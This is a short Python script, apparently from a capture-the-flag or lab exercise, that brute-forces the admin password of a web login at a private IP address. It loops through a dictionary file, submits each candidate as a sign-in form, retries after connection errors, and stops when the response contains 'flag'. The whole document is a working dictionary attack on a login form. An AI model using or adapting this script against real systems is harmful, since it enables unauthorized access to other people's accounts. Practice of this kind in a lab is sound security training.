import requests
import re
from time import sleep

with open("dic.txt", 'r') as dic:
    tmp = dic.read()
    list_pwd = tmp.split('\n')

for pwd in list_pwd:
    tmp = re.sub(r"[^0-9a-zA-Z]", "", pwd)
    form ={"page": "signin",
        "username": "admin",
        "password": tmp,
        "Login": "Login"}
    try:
        r = requests.get("http://192.168.1.97/", form)
    except:
        print("Retry in 20s with password :", tmp)
        sleep(20)
        r = requests.get("http://192.168.1.97/", form)
    if "flag" in r.text:
        print("The password for admin is :", tmp)
        break